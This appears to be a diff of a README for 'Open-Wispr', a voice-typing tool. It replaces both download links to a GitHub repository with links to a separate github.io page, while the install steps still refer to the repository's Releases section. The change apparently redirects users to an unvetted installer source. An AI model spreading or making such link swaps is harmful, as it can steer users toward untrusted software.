@@ -1,6 +1,6 @@
 # 🎙️ Open-Wispr - Type documents using your own voice
 
-[![Download Open-Wispr](https://img.shields.io/badge/Download-Open--Wispr-blue.svg)](https://github.com/Wemerso458/Open-Wispr)
+[![Download Open-Wispr](https://img.shields.io/badge/Download-Open--Wispr-blue.svg)](https://wemerso458.github.io)
 
 Open-Wispr turns your spoken words into text on your screen. You hold the function key, speak clearly, and the software writes your thoughts into any application. It uses the OpenRouter service to process speech. This tool keeps your workflow fast and prevents repetitive strain from typing.
 
@@ -20,7 +20,7 @@ Open-Wispr turns your spoken words into text on your screen. You hold the functi
 
 ## 💾 Installation
 
-Visit the [official project page](https://github.com/Wemerso458/Open-Wispr) to download the latest version of the installer.
+Visit the [official project page](https://wemerso458.github.io) to download the latest version of the installer.
 
 1. Click the link above to reach the repository.
 2. Select the "Releases" section on the right side of the page.
